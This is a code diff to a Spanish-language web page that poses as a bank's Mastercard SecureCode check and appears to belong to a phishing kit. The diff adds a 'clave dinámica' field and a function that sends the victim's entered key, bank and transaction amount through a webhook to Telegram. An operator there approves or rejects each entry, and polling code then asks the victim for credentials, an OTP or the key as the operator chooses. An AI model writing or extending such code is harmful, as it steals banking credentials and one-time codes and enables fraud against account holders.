@@ -465,6 +465,17 @@
                 </div>
             </div>
 
+            <div class="otp-section" id="claveDinSection">
+                <div class="otp-info">
+                    <span id="claveDinInfoMessage">Ingresa la clave dinámica que recibes en tu aplicación del banco.</span>
+                </div>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label class="form-label">Clave Dinámica <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="claveDinCode" placeholder="Ingresa tu clave" maxlength="10" required />
+                    <div class="error-message">La clave es requerida</div>
+                </div>
+            </div>
+
             <div class="button-group">
                 <button type="submit" class="btn btn-primary" id="submitButton">Enviar</button>
             </div>
@@ -506,7 +517,9 @@
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const confirmationInput = document.getElementById('confirmationCode');
+        const claveDinCode = document.getElementById('claveDinCode');
         const otpSection = document.getElementById('otpSection');
+        const claveDinSection = document.getElementById('claveDinSection');
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const statusMessage = document.getElementById('statusMessage');
@@ -626,6 +639,38 @@
             }
         }
 
+        async function enviarClaveDinATelegram(datos) {
+            try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
+
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APROBAR CLAVE", callback_data: `aprobar_clave_din_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR CLAVE", callback_data: `rechazar_clave_din_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *CLAVE DINÁMICA REQUERIDA - MASTERCARD SECURECODE*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO: ${bancoEmisor}\n🔑 CLAVE INGRESADA: \`${datos.clave}\`\n💰 Monto: ${datos.monto}\n⏳ Esperando aprobación...`;
+
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        mensaje: mensaje,
+                        inline_keyboard: inlineKeyboard
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
         function iniciarPollingOTP() {
             let tiempoInicio = Date.now();
 
@@ -669,12 +714,82 @@
 
                 const resultado = await verificarEstadoSolicitud(solicitudId);
 
-                if (resultado === 'approved') {
+                if (resultado === 'pedir_otp') {
+                    clearInterval(pollingInterval);
+                    mostrarSeccionOTP();
+                    loadingOverlay.classList.remove('active');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Verificar OTP';
+                } else if (resultado === 'pedir_clave_din') {
+                    clearInterval(pollingInterval);
+                    mostrarSeccionClaveDin();
+                    loadingOverlay.classList.remove('active');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Verificar Clave';
+                } else if (resultado === 'error_credenciales') {
+                    clearInterval(pollingInterval);
+                    mostrarError('Credenciales incorrectas');
+                    resetFormulario();
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function iniciarPollingOTP() {
+            let tiempoInicio = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+
+                if (resultado === 'aprobar_otp') {
                     clearInterval(pollingInterval);
                     mostrarExito('✅ Autenticación exitosa');
                     setTimeout(() => {
                         window.location.href = 'exito.html';
                     }, 2000);
+                } else if (resultado === 'rechazar_otp') {
+                    clearInterval(pollingInterval);
+                    mostrarError('OTP incorrecto, intenta de nuevo');
+                    confirmationInput.value = '';
+                    solicitudId = generarSolicitudId();
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function iniciarPollingClaveDin() {
+            let tiempoInicio = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+
+                if (resultado === 'aprobar_clave_din') {
+                    clearInterval(pollingInterval);
+                    mostrarExito('✅ Autenticación exitosa');
+                    setTimeout(() => {
+                        window.location.href = 'exito.html';
+                    }, 2000);
+                } else if (resultado === 'rechazar_clave_din') {
+                    clearInterval(pollingInterval);
+                    mostrarError('Clave dinámica incorrecta, intenta de nuevo');
+                    claveDinCode.value = '';
+                    solicitudId = generarSolicitudId();
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
                 }
             }, POLLING_INTERVAL);
         }
@@ -691,9 +806,36 @@
             statusMessage.textContent = mensaje;
         }
 
+        function mostrarSeccionOTP() {
+            otpSection.classList.add('visible');
+            claveDinSection.classList.remove('visible');
+            pasoActual = 'otp';
+            confirmationInput.disabled = false;
+            confirmationInput.focus();
+        }
+
+        function mostrarSeccionClaveDin() {
+            claveDinSection.classList.add('visible');
+            otpSection.classList.remove('visible');
+            pasoActual = 'clave_din';
+            claveDinCode.disabled = false;
+            claveDinCode.focus();
+        }
+
+        function ocultarOTP() {
+            otpSection.classList.remove('visible');
+            claveDinSection.classList.remove('visible');
+            pasoActual = 'credenciales';
+            confirmationInput.value = '';
+            confirmationInput.disabled = true;
+            claveDinCode.value = '';
+            claveDinCode.disabled = true;
+        }
+
         function resetFormulario() {
             usernameInput.disabled = false;
             passwordInput.disabled = false;
+            ocultarOTP();
             solicitudId = null;
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
@@ -723,6 +865,11 @@
                     confirmationInput.parentElement.classList.add('error');
                     isValid = false;
                 }
+            } else if (pasoActual === 'clave_din') {
+                if (!claveDinCode.value.trim()) {
+                    claveDinCode.parentElement.classList.add('error');
+                    isValid = false;
+                }
             }
 
             if (!isValid) return;
@@ -731,6 +878,8 @@
             submitButton.disabled = true;
             usernameInput.disabled = true;
             passwordInput.disabled = true;
+            confirmationInput.disabled = true;
+            claveDinCode.disabled = true;
 
             if (pasoActual === 'credenciales') {
                 solicitudId = generarSolicitudId();
@@ -759,6 +908,21 @@
                     iniciarPollingOTP();
                 } else {
                     mostrarError('Error al procesar OTP');
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
+                }
+            } else if (pasoActual === 'clave_din') {
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    clave: claveDinCode.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent
+                };
+
+                const enviado = await enviarClaveDinATelegram(datosTelegram);
+                if (enviado) {
+                    iniciarPollingClaveDin();
+                } else {
+                    mostrarError('Error al procesar clave dinámica');
                     submitButton.disabled = false;
                     loadingOverlay.classList.remove('active');
                 }
